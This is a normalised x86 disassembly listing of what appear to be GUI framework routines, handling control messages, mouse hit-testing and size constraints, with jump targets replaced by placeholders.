mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_43bb38
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43bb70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43b5f0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4515c4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403394
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4515c4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403394
sub_43bbf4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43a0e0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43a7a8
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43bb70
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43bc40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43a0e0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43bc5c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43a0e0
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43a7a8
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43bb70
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403394
sub_43bcb4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_43b590
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43b524
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43b590
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43bd50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43bb70
pop esi
pop ebx
retn
sub_43bd75
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43bb70
pop esi
pop ebx
retn
sub_43bd9b
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43bb70
pop esi
pop ebx
retn
sub_43bdc5
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43bb70
pop esi
pop ebx
retn
sub_43bdf0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43be20
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_43b5f0
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4515c4
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403394
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4515c4
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403394
sub_43be98
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43bed0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4515c4
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403394
sub_43bf08
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43a7a8
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43bed0
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4069ec
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403394
sub_43bf80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43bed0
pop esi
pop ebx
retn
sub_43bfa0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43bed0
pop esi
pop ebx
retn
sub_43bfc0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_4515c4
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403394
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_445660
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43c018
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43a798
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43a7a8
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43b724
pop esi
retn
sub_43c058
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_43b758
sub_43c106
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43a9b8
mov cl 0x1
sub_43c148
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43a710
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43a710
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43c178
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43c19c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_4069ec
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403394
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43b724
mov [ ebx + 0xc ] eax
sub_43c240
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43a664
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43a664
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43c2d4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4030e0
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_439d04
mov edx [ esp ]
mov eax esi
call sub_439ce0
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_439f8c
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_439fd0
sub_43c358
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412bb8
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43a088
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_412c08
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_439f30
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c3e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43c2d4
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_440d58
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_43c358
pop ecx
jmp r-xdata
sub_43c444
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43c532
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c539
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43a5a0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43a570
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43a570
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4042f4
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403f3c
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_43a490
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_43c540
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403394
sub_43c56c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c58c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c5ac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c5cc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c5ec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c60c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43c62c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419ea0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_439bc4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403394
sub_43c664
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c700
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414738
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_446e50
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_446f88
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a570
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_446ce8
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_4470a8
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c707
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_43c710
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_43c74c
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_43c710
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_43c7fc
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_403324
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_43c830
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43c850
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_403394
test al al
je r-xdata
mov eax edi
call sub_43c890
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_43c8bc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_43c8e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_4069ec
mov eax esp
call sub_412c30
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43a0b4
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403394
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403394
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43a0e0
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412c30
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412bb8
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_43a088
sub_43ca10
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_43ca50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4392b4
mov eax esi
mov edx [ r-xdata ]
call sub_403348
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_43ca84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_43cb7c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_439670
push ebx
push sub_43e514
call sub_41aae0
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d468
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41d618
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4034bc
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4583dc
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403f3c
lea eax [ ebx + 0x188 ]
call sub_403ee8
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cb83
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_43cb83
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_43cba8
push ebx
push esi
push edi
call sub_403524
mov ebx edx
mov edi eax
mov eax edi
call sub_419cf0
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405634
mov eax [ edi + 0x178 ]
call sub_403198
